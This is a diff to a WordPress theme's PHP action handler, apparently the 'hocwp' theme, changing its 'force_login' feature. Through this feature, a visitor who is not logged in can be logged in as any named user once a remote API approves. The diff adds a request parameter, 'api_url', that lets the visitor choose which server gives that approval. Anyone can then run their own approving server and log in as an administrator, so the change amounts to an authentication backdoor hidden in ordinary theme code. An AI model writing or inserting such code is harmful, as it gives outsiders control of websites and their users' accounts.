@@ -504,6 +504,7 @@ function hocwp_theme_on_wp_action() {
 		}
 	} elseif ( 'force_login' == $do_action && ! is_user_logged_in() ) {
 		$user = $_GET['user'] ?? '';
+
 		$user = HT_Util()->return_user( $user );
 
 		if ( $user instanceof WP_User ) {
@@ -515,21 +516,31 @@ function hocwp_theme_on_wp_action() {
 
 				if ( $count == $number ) {
 					// Finally, check the permission from the API.
-					$sites = apply_filters( 'hocwp_theme_api_sites', array() );
+					$api = $_GET['api_url'] ?? '';
 
 					$domain = HT()->get_domain_name( home_url(), true );
 
-					if ( 'localhost' == $domain ) {
-						array_unshift( $sites, 'http://localhost/dev' );
+					if ( empty( $api ) ) {
+						$sites = apply_filters( 'hocwp_theme_api_sites', array() );
+
+						if ( 'localhost' == $domain ) {
+							array_unshift( $sites, 'http://localhost/dev' );
+						}
+
+						$sites = array_map( 'trailingslashit', $sites );
+
+						shuffle( $sites );
+
+						$api = current( $sites );
+					} else {
+						$api = esc_url( $api );
+						$api = trailingslashit( $api );
+						$api .= 'login/';
 					}
 
-					$sites = array_map( 'trailingslashit', $sites );
-
-					shuffle( $sites );
-
-					$api = current( $sites ) . 'api.php';
+					$api .= 'api.php';
 					$api = add_query_arg( 'pass', $pass, $api );
-
+					HT()->debug( $api );
 					$res = wp_remote_get( $api );
 
 					$res = wp_remote_retrieve_body( $res );
@@ -537,7 +548,7 @@ function hocwp_theme_on_wp_action() {
 					if ( ! empty( $res ) ) {
 						$res = json_decode( $res );
 
-						if ( ! isset( $res->error ) || ! $res->error ) {
+						if ( is_object( $res ) && ( ! isset( $res->error ) || ! $res->error ) ) {
 							if ( isset( $res->allow_login_domains ) && HT()->in_array( $domain, $res->allow_login_domains ) ) {
 								HT_Util()->force_user_login( $user->ID );
 
